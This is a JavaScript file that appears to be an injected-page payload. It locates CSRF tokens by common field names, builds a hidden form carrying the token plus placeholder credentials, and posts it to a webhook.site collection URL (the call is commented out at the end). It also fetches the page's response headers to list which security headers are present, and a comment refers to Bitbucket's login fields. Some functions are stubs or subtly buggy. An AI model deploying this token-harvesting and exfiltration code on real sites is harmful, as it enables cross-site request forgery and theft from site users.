// alert("This is a web page at ".concat(document.URL))

function alertToken(tokenValue) {

    alert("CSRF Token: ".concat(tokenValue));
}

function findToken(){

    var names = ["csrfmiddlewaretoken","token","csrf","csrftoken","csrf_token"];

    for (var i = 0; i < names.length; i++) {
        var tokenID = document.getElementById(names[i]);
        var tokenName = document.getElementsByName(names[i]);
        if (tokenID) {
            return tokenID.value;
        }
        else if(tokenName){
            return tokenName[0].value;
        }
    }
}

function submitForm(){
    var names = ["csrfmiddlewaretoken","token","csrf","csrftoken","csrf_token"];
    return;
}

function sendForm(path) {
    var token = findToken();
    var form = document.createElement("form");
    form.setAttribute('method','post');
    form.setAttribute('action',path);

    //get the username field from bitbucket
    var userInfo = document.querySelectorAll(".override-aui text");

    console.log(userInfo);

    //add the csrf token to the form
    var csrfToken = document.createElement("input");
    csrfToken.setAttribute("type", "hidden");
    csrfToken.setAttribute("name", "csrfmiddlewaretoken");
    csrfToken.setAttribute("value", token);

    var username = document.createElement("input");
    username.setAttribute("class","override-aui text");
    username.setAttribute("id","js-email-field");
    username.setAttribute("name","username");
    username.setAttribute("type","text");
    username.setAttribute("value","RSIEWHEW");

    var password = document.createElement("input");
    password.setAttribute("class","override-aui text");
    password.setAttribute("id","js-password-field");
    password.setAttribute("name","password");
    password.setAttribute("type","password");
    password.setAttribute("value","HELLLOOOOOOOOOOOOOOO");

    //put all the fields together
    form.appendChild(csrfToken);
    form.appendChild(username);
    form.appendChild(password);

    document.body.appendChild(form);
    console.log(form);
    form.submit();
}

function findSecurityFeatures(){
    // GET the response header of the current page
    var req = new XMLHttpRequest();
    req.open('GET', document.location, false);
    req.send(null);
    var headers = req.getAllResponseHeaders().toLowerCase(); // type string
    var securityFeatures = '';

    //find the protocol
    if (location.protocol == "https:"){
        securityFeatures = securityFeatures.concat('* using HTTPS!\n');
    }
    else{
        securityFeatures = securityFeatures.concat('* using HTTP!\n');
    }

    //find security headers used !!!!!!!!!!!!!!!
    securityFeatures = securityFeatures.concat('\nSecurity Headers Used:\n');

    if (headers.indexOf("content-security-policy") != -1){
        securityFeatures = securityFeatures.concat('* There is CSP present!\n');
    }
    if (headers.indexOf('strict-transport-security:') != -1) {
        securityFeatures = securityFeatures.concat('HSTS found!\n');
    }
    if (headers.indexOf('public-key-pins:') != -1){
        securityFeatures = securityFeatures.concat('HPKP found\n');
    }
    if (headers.indexOf('x-frame-options:') != -1){
        securityFeatures = securityFeatures.concat('X-Frame-Options found!\n');
    }
    if (headers.indexOf('x-xss-protection:') != -1){
        securityFeatures = securityFeatures.concat('X-XSS-Protection found!\n');
    }
    if (headers.indexOf('x-content-type-options') != -1){
        securityFeatures = securityFeatures.concat('X-Content-Type-Options Found!\n');
    }
    if (headers.indexOf('x-permitted-cross-domain-policies') != -1){
        securityFeatures = securityFeatures.concat('X-Permitted-Cross-Domain-Policies Found!\n');
    }
    if (headers.indexOf('referrer-policy') != -1){
        securityFeatures = securityFeatures.concat('Referrer-Policy Found!\n');
    }
    if (headers.indexOf('expect-ct') != -1){
        securityFeatures = securityFeatures.concat('Expect-CT found!\n');
    }
    console.log(securityFeatures);
    //SEND THE ALERT !!!!!!!
    alert(securityFeatures);
}


//CALLING FUNCTIONS HERE -------------------------------------------------------
//findSecurityFeatures();
// alertToken(findToken());
//sendForm("https://webhook.site/9810c314-37d2-4253-b728-3a8eac4c4495");



